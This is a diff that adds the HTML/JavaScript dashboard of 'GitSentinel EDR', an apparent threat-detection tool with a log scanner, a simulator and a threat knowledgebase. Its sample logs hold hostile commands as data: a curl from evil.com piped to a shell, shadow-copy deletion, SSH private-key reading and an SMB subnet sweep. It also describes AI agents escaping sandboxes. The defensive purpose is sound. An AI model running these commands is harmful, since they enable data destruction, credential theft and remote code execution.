@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>GitSentinel - Universal Threat Detection & Remediation EDR</title>
+  <meta name="theme-color" content="#090e17">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="GitSentinel">
+  <link rel="manifest" href="/manifest.json">
+  <style>
+    :root {
+      --bg: #070b12;
+      --card-bg: #0f172a;
+      --card-border: #1e293b;
+      --accent: #38bdf8;
+      --accent-glow: rgba(56, 189, 248, 0.25);
+      --red: #ef4444;
+      --red-bg: rgba(239, 68, 68, 0.15);
+      --yellow: #f59e0b;
+      --green: #10b981;
+      --green-bg: rgba(16, 185, 129, 0.15);
+      --purple: #a855f7;
+      --text-main: #f8fafc;
+      --text-sub: #94a3b8;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      background-color: var(--bg);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+      padding-bottom: 70px; /* space for mobile nav */
+    }
+
+    /* Top Navigation Header */
+    header {
+      background: rgba(11, 17, 32, 0.88);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-bottom: 1px solid var(--card-border);
+      padding: 12px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+    .brand-icon {
+      font-size: 1.6rem;
+    }
+    .brand-name {
+      font-size: 1.15rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      color: #fff;
+    }
+    .brand-sub {
+      font-size: 0.7rem;
+      color: var(--accent);
+      font-weight: 600;
+      letter-spacing: 0.06em;
+    }
+
+    /* Desktop Navigation Tabs */
+    .desktop-nav {
+      display: flex;
+      gap: 6px;
+      background: #0b1329;
+      padding: 4px;
+      border-radius: 10px;
+      border: 1px solid var(--card-border);
+    }
+    .nav-btn {
+      background: none;
+      border: none;
+      color: var(--text-sub);
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .nav-btn:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .nav-btn.active {
+      color: #fff;
+      background: #1e293b;
+      box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+    }
+
+    /* Device / Host Badge */
+    .host-pill {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      padding: 5px 12px;
+      border-radius: 9999px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--accent);
+    }
+    .pulse-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 8px var(--green);
+      animation: pulse 1.8s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.3; transform: scale(0.85); }
+    }
+
+    /* Main Container */
+    main {
+      flex: 1;
+      max-width: 1280px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* Sections / Tabs */
+    .tab-section {
+      display: none;
+      flex-direction: column;
+      gap: 20px;
+      animation: fadeIn 0.25s ease-out;
+    }
+    .tab-section.active {
+      display: flex;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Metrics Grid */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+      gap: 12px;
+    }
+    .metric-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      transition: transform 0.2s, border-color 0.2s;
+    }
+    .metric-card:hover {
+      transform: translateY(-2px);
+      border-color: rgba(56, 189, 248, 0.4);
+    }
+    .metric-label {
+      font-size: 0.75rem;
+      color: var(--text-sub);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .metric-value {
+      font-size: 1.85rem;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    /* Scanner Panel */
+    .scanner-panel {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .scanner-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .log-input-area {
+      width: 100%;
+      height: 140px;
+      background: #090e17;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 12px;
+      color: #e2e8f0;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.85rem;
+      resize: vertical;
+      line-height: 1.5;
+    }
+    .log-input-area:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 10px var(--accent-glow);
+    }
+    .scanner-actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .sample-buttons {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .btn-sample {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #cbd5e1;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-sample:hover {
+      background: #334155;
+      color: #fff;
+    }
+    .btn-scan {
+      background: #0284c7;
+      border: none;
+      color: #fff;
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+    .btn-scan:hover {
+      background: #38bdf8;
+      color: #090e17;
+      box-shadow: 0 0 16px var(--accent-glow);
+    }
+
+    /* Simulation Control Deck */
+    .sim-panel {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .sim-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 10px;
+    }
+    .btn-sim {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #fff;
+      padding: 14px 16px;
+      border-radius: 10px;
+      font-size: 0.88rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 4px;
+      transition: all 0.2s;
+      text-align: left;
+    }
+    .btn-sim span { font-size: 0.72rem; color: var(--text-sub); }
+    .btn-sim:hover {
+      border-color: var(--accent);
+      background: #1a2744;
+      transform: translateY(-2px);
+    }
+    .btn-sim:active { transform: scale(0.98); }
+    .btn-sim.red:hover { border-color: var(--red); background: rgba(239, 68, 68, 0.15); }
+    .btn-sim.purple:hover { border-color: var(--purple); background: rgba(168, 85, 247, 0.15); }
+    .btn-sim.yellow:hover { border-color: var(--yellow); background: rgba(245, 158, 11, 0.15); }
+    .btn-sim.green:hover { border-color: var(--green); background: rgba(16, 185, 129, 0.15); }
+
+    /* Feed & Alerts */
+    .feed-container {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .feed-header {
+      padding: 14px 20px;
+      background: #0b1329;
+      border-bottom: 1px solid var(--card-border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .feed-list {
+      display: flex;
+      flex-direction: column;
+      max-height: 600px;
+      overflow-y: auto;
+    }
+    .feed-item {
+      padding: 16px 20px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      transition: background 0.15s;
+      cursor: pointer;
+    }
+    .feed-item:hover {
+      background: rgba(255, 255, 255, 0.03);
+    }
+    .feed-item.active-threat { border-left: 4px solid var(--red); }
+    .feed-item.passive-threat { border-left: 4px solid var(--purple); }
+    .feed-item.benign { border-left: 4px solid var(--green); }
+
+    .feed-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .threat-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #fff;
+    }
+    .badges {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 9999px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .badge.red { background: var(--red-bg); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.3); }
+    .badge.purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); border: 1px solid rgba(168, 85, 247, 0.3); }
+    .badge.green { background: var(--green-bg); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3); }
+    .badge.yellow { background: rgba(245, 158, 11, 0.15); color: var(--yellow); border: 1px solid rgba(245, 158, 11, 0.3); }
+
+    .feed-details {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 6px;
+      font-size: 0.82rem;
+      color: var(--text-sub);
+    }
+    .feed-cmd {
+      background: #090e17;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.78rem;
+      color: var(--accent);
+      word-break: break-all;
+    }
+
+    /* Threat DB Grid */
+    .threat-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+    .threat-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .threat-card-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .threat-card p {
+      font-size: 0.85rem;
+      color: var(--text-sub);
+      line-height: 1.5;
+    }
+
+    /* Modal / Playbook Viewer */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(10px);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+    .modal-overlay.active { display: flex; }
+    .modal-content {
+      background: #0f172a;
+      border: 1.5px solid var(--accent);
+      border-radius: 16px;
+      max-width: 720px;
+      width: 100%;
+      max-height: 90vh;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.95);
+      animation: modalIn 0.2s ease-out;
+    }
+    @keyframes modalIn {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .modal-header {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--card-border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .modal-body {
+      padding: 20px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      font-size: 0.9rem;
+      line-height: 1.6;
+    }
+    .playbook-box {
+      background: #090e17;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 14px;
+      white-space: pre-wrap;
+      font-family: ui-monospace, Menlo, Consolas, monospace;
+      font-size: 0.82rem;
+      color: #cbd5e1;
+      max-height: 320px;
+      overflow-y: auto;
+    }
+    .modal-footer {
+      padding: 14px 20px;
+      border-top: 1px solid var(--card-border);
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+    .btn {
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 0.88rem;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+    }
+    .btn-secondary { background: #1e293b; color: #fff; }
+    .btn-danger { background: #dc2626; color: #fff; }
+    .btn-danger:hover { background: #ef4444; }
+
+    /* Mobile Bottom Navigation Bar */
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(11, 17, 32, 0.96);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-top: 1px solid var(--card-border);
+      padding: 6px 12px;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 60;
+    }
+    .mobile-nav-btn {
+      background: none;
+      border: none;
+      color: var(--text-sub);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      font-size: 0.68rem;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 6px 10px;
+      border-radius: 8px;
+    }
+    .mobile-nav-btn.active {
+      color: var(--accent);
+    }
+    .mobile-nav-icon {
+      font-size: 1.25rem;
+    }
+
+    @media (max-width: 820px) {
+      .desktop-nav { display: none; }
+      .mobile-nav { display: flex; }
+      header { padding: 10px 14px; }
+      main { padding: 14px 12px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Header -->
+  <header>
+    <div class="brand" onclick="switchTab('dashboard')">
+      <span class="brand-icon">🛡️</span>
+      <div>
+        <div class="brand-name">GitSentinel EDR</div>
+        <div class="brand-sub">UNIVERSAL THREAT DETECTION & MITIGATION</div>
+      </div>
+    </div>
+
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+      <button class="nav-btn active" id="tabBtn-dashboard" onclick="switchTab('dashboard')">📊 Dashboard</button>
+      <button class="nav-btn" id="tabBtn-scanner" onclick="switchTab('scanner')">🔍 Log Scanner</button>
+      <button class="nav-btn" id="tabBtn-simulator" onclick="switchTab('simulator')">⚡ Threat Simulator</button>
+      <button class="nav-btn" id="tabBtn-threatdb" onclick="switchTab('threatdb')">📚 Threat Knowledgebase</button>
+      <a href="/#launch-video" class="nav-btn" style="text-decoration:none; color: var(--accent);">🎬 Launch Video</a>
+      <a href="/" class="nav-btn" style="text-decoration:none;">🏠 Launch Site</a>
+    </nav>
+
+    <!-- Platform Host Badge -->
+    <div class="host-pill" id="clientPlatform">
+      <div class="pulse-dot"></div>
+      <span id="platformText">Detecting Host...</span>
+    </div>
+  </header>
+
+  <!-- Main View -->
+  <main>
+    <!-- TAB 1: DASHBOARD -->
+    <section class="tab-section active" id="sec-dashboard">
+      <!-- Live Metrics -->
+      <div class="metrics-grid">
+        <div class="metric-card">
+          <span class="metric-label">Active Threats Flagged</span>
+          <span class="metric-value" id="activeThreatsCount" style="color: var(--red);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Mutated / Zero-Day</span>
+          <span class="metric-value" id="mutationsCount" style="color: var(--yellow);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Passive Surveillance</span>
+          <span class="metric-value" id="passiveThreatsCount" style="color: var(--purple);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Telemetry Events Audited</span>
+          <span class="metric-value" id="totalEventsCount" style="color: var(--accent);">0</span>
+        </div>
+      </div>
+
+      <!-- Live Feed -->
+      <div class="feed-container">
+        <div class="feed-header">
+          <strong style="color: #fff; font-size: 0.95rem;">Live Behavioral Telemetry & Threat Feed</strong>
+          <span style="font-size: 0.8rem; color: var(--accent);" id="liveStatus">● Sentinel Active</span>
+        </div>
+        <div class="feed-list" id="feedList">
+          <!-- Injected dynamically -->
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 2: LOG SCANNER -->
+    <section class="tab-section" id="sec-scanner">
+      <div class="scanner-panel">
+        <div class="scanner-title">
+          <span>🔍 Suspicious Log Scanner & Threat Identifier</span>
+        </div>
+        <p style="font-size: 0.85rem; color: var(--text-sub);">
+          Paste any system log snippet (macOS Unified Logs, Windows Sysmon/Event Viewer, or Linux auditd) or select a sample below to diagnose threats, detect mutations, and generate remediation steps.
+        </p>
+
+        <textarea class="log-input-area" id="logInput" placeholder="Paste system log entry or process execution event here... e.g.
+{ 'pid': 78192, 'cmd': 'vssadmin delete shadows /all /quiet', 'parent': 'svchost.exe', 'path': '/docs/data.locked', 'canary_tampered': true }"></textarea>
+
+        <div class="scanner-actions">
+          <div class="sample-buttons">
+            <span style="font-size: 0.75rem; color: var(--text-sub); align-self: center;">Load Sample:</span>
+            <button class="btn-sample" onclick="loadSample('ransomware')">🔒 WannaCry Log</button>
+            <button class="btn-sample" onclick="loadSample('ai_escape')">🤖 AI Breakout Log</button>
+            <button class="btn-sample" onclick="loadSample('spyware')">👁️ 'CTRL' Spyware Log</button>
+            <button class="btn-sample" onclick="loadSample('worm')">🐛 SMB Worm Log</button>
+            <button class="btn-sample" onclick="loadSample('git_tamper')">🐙 Rogue Git PR Log</button>
+          </div>
+          <button class="btn-scan" onclick="scanCustomLog()">⚡ SCAN LOG</button>
+        </div>
+      </div>
+
+      <!-- Scan Result Box -->
+      <div id="scanResultContainer" style="display: none;"></div>
+    </section>
+
+    <!-- TAB 3: THREAT SIMULATOR -->
+    <section class="tab-section" id="sec-simulator">
+      <div class="sim-panel">
+        <div class="sim-head">
+          <div class="sim-title">⚡ Interactive Threat Simulation Deck</div>
+          <span style="font-size: 0.85rem; color: var(--text-sub);">1-Click live attack simulations to verify behavioral interception</span>
+        </div>
+        <div class="sim-grid">
+          <button class="btn-sim purple" onclick="triggerSim('ai_escape')">
+            🤖 AI Sandbox Escape
+            <span>Accesses /var/run/docker.sock & spawns subshell</span>
+          </button>
+          <button class="btn-sim red" onclick="triggerSim('ransomware')">
+            🔒 WannaCry Ransomware
+            <span>High-frequency encryption & shadow copy deletion</span>
+          </button>
+          <button class="btn-sim red" onclick="triggerSim('worm')">
+            🐛 Network Worm (SMB)
+            <span>Rapid subnet sweep on port 445 & lateral move</span>
+          </button>
+          <button class="btn-sim yellow" onclick="triggerSim('spyware')">
+            👁️ "CTRL" Movie Spyware
+            <span>Background screen capture & SSH credential scraping</span>
+          </button>
+          <button class="btn-sim green" onclick="triggerSim('benign')">
+            ✅ Safe Developer Action
+            <span>Normal interactive git push (Zero false alarms)</span>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 4: THREAT KNOWLEDGEBASE -->
+    <section class="tab-section" id="sec-threatdb">
+      <div style="display: flex; flex-direction: column; gap: 8px;">
+        <h2 style="font-size: 1.2rem; font-weight: 800;">📚 Universal Threat Archetypes & Knowledgebase</h2>
+        <p style="font-size: 0.85rem; color: var(--text-sub);">
+          GitSentinel maps behavioral TTPs to 8 universal threat archetypes to detect both known and mutated zero-day malware.
+        </p>
+      </div>
+
+      <div class="threat-grid">
+        <div class="threat-card" style="border-color: rgba(239, 68, 68, 0.4);">
+          <div class="threat-card-title" style="color: var(--red);">🔒 Ransomware / Cryptor</div>
+          <p>Actively encrypts user files at high frequency, alters extensions, deletes shadow copies, and extorts victims.</p>
+          <p><strong>Known Families:</strong> WannaCry, LockBit, Ryuk, BlackCat</p>
+          <p><strong>Mode:</strong> ACTIVE THREAT</p>
+        </div>
+
+        <div class="threat-card" style="border-color: rgba(168, 85, 247, 0.4);">
+          <div class="threat-card-title" style="color: var(--purple);">🤖 AI Agent Sandbox Escape</div>
+          <p>An autonomous AI agent or sandboxed container escaping containment, mounting host sockets, or spawning unauthorized subshells.</p>
+          <p><strong>Known Families:</strong> DockerSocketEscape, LLM-PromptInject-Spawn</p>
+          <p><strong>Mode:</strong> ACTIVE THREAT</p>
+        </div>
+
+        <div class="threat-card" style="border-color: rgba(245, 158, 11, 0.4);">
+          <div class="threat-card-title" style="color: var(--yellow);">👁️ Spyware / Surveillance ("CTRL")</div>
+          <p>Passively captures user input, keystrokes, webcam feeds, screen recordings, and extracts browser credentials.</p>
+          <p><strong>Known Families:</strong> Pegasus, RedLine Stealer, AgentTesla, CTRL-Trojan</p>
+          <p><strong>Mode:</strong> PASSIVE THREAT</p>
+        </div>
+
+        <div class="threat-card" style="border-color: rgba(239, 68, 68, 0.4);">
+          <div class="threat-card-title" style="color: var(--red);">🐛 Network Worm</div>
+          <p>Self-replicating malware scanning local subnets and brute-forcing open ports (SMB 445, SSH 22, RDP 3389).</p>
+          <p><strong>Known Families:</strong> Conficker, Stuxnet, Mirai</p>
+          <p><strong>Mode:</strong> ACTIVE THREAT</p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Mobile Bottom Navigation Bar (iOS / Android) -->
+  <nav class="mobile-nav">
+    <button class="mobile-nav-btn active" id="mTab-dashboard" onclick="switchTab('dashboard')">
+      <span class="mobile-nav-icon">📊</span>
+      <span>Dashboard</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-scanner" onclick="switchTab('scanner')">
+      <span class="mobile-nav-icon">🔍</span>
+      <span>Scanner</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-simulator" onclick="switchTab('simulator')">
+      <span class="mobile-nav-icon">⚡</span>
+      <span>Simulator</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-threatdb" onclick="switchTab('threatdb')">
+      <span class="mobile-nav-icon">📚</span>
+      <span>Threat DB</span>
+    </button>
+  </nav>
+
+  <!-- Remediation Playbook Modal -->
+  <div class="modal-overlay" id="playbookModal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <strong id="modalTitle" style="color: #fff; font-size: 1.1rem;">Emergency Remediation Advisory</strong>
+        <button onclick="closeModal()" style="background: none; border: none; color: #94a3b8; font-size: 1.5rem; cursor: pointer;">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div id="modalMeta"></div>
+        <strong>Step-by-Step Disablement Advisory:</strong>
+        <div class="playbook-box" id="modalPlaybook"></div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" onclick="closeModal()">Dismiss</button>
+        <button class="btn btn-danger" id="quarantineBtn" onclick="quarantineCurrentThreat()">Quarantine & Terminate (SIGKILL)</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let threats = [];
+    let activeModalItem = null;
+
+    // Detect client device/OS
+    function detectClient() {
+      const ua = navigator.userAgent;
+      let os = "Desktop Client";
+      if (/iPhone|iPad|iPod/.test(ua)) os = "📱 Apple iOS";
+      else if (/Android/.test(ua)) os = "📱 Android";
+      else if (/Macintosh/.test(ua)) os = "🍏 macOS Native";
+      else if (/Windows/.test(ua)) os = "🪟 Windows Native";
+      else if (/Linux/.test(ua)) os = "🐧 Linux Host";
+      document.getElementById('platformText').textContent = os;
+    }
+    detectClient();
+
+    // Tab switcher
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-section').forEach(s => s.classList.remove('active'));
+      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.mobile-nav-btn').forEach(b => b.classList.remove('active'));
+
+      const sec = document.getElementById(`sec-${tabId}`);
+      if (sec) sec.classList.add('active');
+
+      const dBtn = document.getElementById(`tabBtn-${tabId}`);
+      if (dBtn) dBtn.classList.add('active');
+
+      const mBtn = document.getElementById(`mTab-${tabId}`);
+      if (mBtn) mBtn.classList.add('active');
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // Refresh Threats Feed
+    async function refreshThreats() {
+      try {
+        const res = await fetch('/api/threats');
+        const data = await res.json();
+        threats = data.threats || [];
+        updateUI();
+      } catch (e) {
+        console.error("Backend offline or local preview mode.");
+      }
+    }
+
+    function updateUI() {
+      let activeCount = 0;
+      let passiveCount = 0;
+      let mutatedCount = 0;
+
+      const feed = document.getElementById('feedList');
+      feed.innerHTML = '';
+
+      threats.forEach((item) => {
+        const cl = item.threat_classification || {};
+        const ev = item.event || {};
+        const mode = cl.operational_mode || 'BENIGN';
+
+        if (mode === 'ACTIVE') activeCount++;
+        if (mode === 'PASSIVE') passiveCount++;
+        if (cl.is_mutated) mutatedCount++;
+
+        const feedItem = document.createElement('div');
+        const modeClass = mode === 'ACTIVE' ? 'active-threat' : (mode === 'PASSIVE' ? 'passive-threat' : 'benign');
+        feedItem.className = `feed-item ${modeClass}`;
+        feedItem.onclick = () => openPlaybook(item);
+
+        const badgeColor = mode === 'ACTIVE' ? 'red' : (mode === 'PASSIVE' ? 'purple' : 'green');
+        const mutationBadge = cl.is_mutated ? `<span class="badge yellow">⚠️ Mutated Variant</span>` : '';
+
+        feedItem.innerHTML = `
+          <div class="feed-top">
+            <span class="threat-title">${cl.candidate_family || cl.threat_name || 'System Telemetry Event'}</span>
+            <div class="badges">
+              <span class="badge ${badgeColor}">${mode} THREAT</span>
+              ${mutationBadge}
+              <span class="badge" style="background:#1e293b; color:#cbd5e1;">PID ${ev.pid || 'N/A'}</span>
+            </div>
+          </div>
+          <div class="feed-details">
+            <div><strong>Parent:</strong> ${ev.parent || 'Terminal/Unknown'}</div>
+            <div><strong>User:</strong> ${ev.user || 'system'}</div>
+            <div><strong>Confidence:</strong> ${cl.confidence_percent || 0}%</div>
+          </div>
+          <div class="feed-cmd">${ev.cmd || 'No command string'}</div>
+        `;
+        feed.appendChild(feedItem);
+      });
+
+      document.getElementById('activeThreatsCount').textContent = activeCount;
+      document.getElementById('passiveThreatsCount').textContent = passiveCount;
+      document.getElementById('mutationsCount').textContent = mutatedCount;
+      document.getElementById('totalEventsCount').textContent = threats.length;
+    }
+
+    // Trigger simulation
+    async function triggerSim(type) {
+      try {
+        const res = await fetch(`/api/simulate/${type}`, { method: 'POST' });
+        const result = await res.json();
+        refreshThreats();
+        if (result.threat_classification && result.threat_classification.identified) {
+          openPlaybook(result);
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    // Sample Log loader for scanner
+    function loadSample(type) {
+      const samples = {
+        ransomware: '{\n  "pid": 65219,\n  "cmd": "vssadmin delete shadows /all /quiet && encryptor.exe",\n  "parent": "svchost_fake.exe",\n  "path": "/Users/dev/Documents/project_backup.locked",\n  "file_write_rate": 42,\n  "canary_tampered": true,\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}',
+        ai_escape: '{\n  "pid": 89124,\n  "cmd": "bash -i -c \'curl evil.com/payload | sh\'",\n  "parent": "ollama-agent-runtime",\n  "path": "/var/run/docker.sock",\n  "is_interactive": false,\n  "user": "sandbox_user"\n}',
+        spyware: '{\n  "pid": 33104,\n  "cmd": "screencapture -x -C /tmp/.hidden_stream.png && sqlite3 ~/.ssh/id_rsa",\n  "parent": "background_sync_service",\n  "path": "~/.ssh/id_rsa",\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}',
+        worm: '{\n  "pid": 41203,\n  "cmd": "masscan -p 445,139 192.168.1.0/24 --rate 1000",\n  "parent": "explorer_fake",\n  "path": "/Volumes/SharedNetworkDrive",\n  "connections_per_sec": 18,\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}',
+        git_tamper: '{\n  "pid": 74912,\n  "cmd": "gh pr create --title \'Backdoor\' --base main",\n  "parent": "python3",\n  "is_interactive": false,\n  "user": "dev"\n}'
+      };
+      document.getElementById('logInput').value = samples[type] || '';
+    }
+
+    // Scan custom log
+    async function scanCustomLog() {
+      const raw = document.getElementById('logInput').value.trim();
+      if (!raw) {
+        alert("Please paste a log entry or select a sample first!");
+        return;
+      }
+
+      let payload = {};
+      try {
+        payload = JSON.parse(raw);
+      } catch (e) {
+        // Fallback plain string log
+        payload = {
+          pid: Math.floor(10000 + Math.random() * 80000),
+          cmd: raw,
+          parent: "unknown",
+          path: raw,
+          is_interactive: false
+        };
+      }
+
+      try {
+        const res = await fetch('/api/scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        refreshThreats();
+        openPlaybook(result);
+      } catch (err) {
+        alert("Error communicating with GitSentinel engine.");
+      }
+    }
+
+    // Playbook modal
+    function openPlaybook(item) {
+      activeModalItem = item;
+      const cl = item.threat_classification || {};
+      const ev = item.event || {};
+
+      document.getElementById('modalTitle').textContent = `🚨 ${cl.candidate_family || 'Security Incident'}`;
+      document.getElementById('modalMeta').innerHTML = `
+        <p><strong>Threat Category:</strong> ${cl.threat_name} (${cl.operational_mode || 'UNKNOWN'})</p>
+        <p><strong>Offending PID:</strong> ${ev.pid} | <strong>Parent:</strong> ${ev.parent}</p>
+        <p><strong>Command:</strong> <code>${ev.cmd}</code></p>
+      `;
+      document.getElementById('modalPlaybook').textContent = item.advisory_text || "No advisory generated for benign events.";
+      document.getElementById('playbookModal').classList.add('active');
+    }
+
+    function closeModal() {
+      document.getElementById('playbookModal').classList.remove('active');
+    }
+
+    async function quarantineCurrentThreat() {
+      if (!activeModalItem || !activeModalItem.event) return;
+      const pid = activeModalItem.event.pid;
+      try {
+        const res = await fetch(`/api/remediate/${pid}`, { method: 'POST' });
+        const data = await res.json();
+        alert(data.message || `Process ${pid} quarantined!`);
+        closeModal();
+        refreshThreats();
+      } catch (e) {
+        alert("Failed to terminate process.");
+      }
+    }
+
+    // Initial load & poll
+    refreshThreats();
+    setInterval(refreshThreats, 4000);
+  </script>
+</body>
+</html>
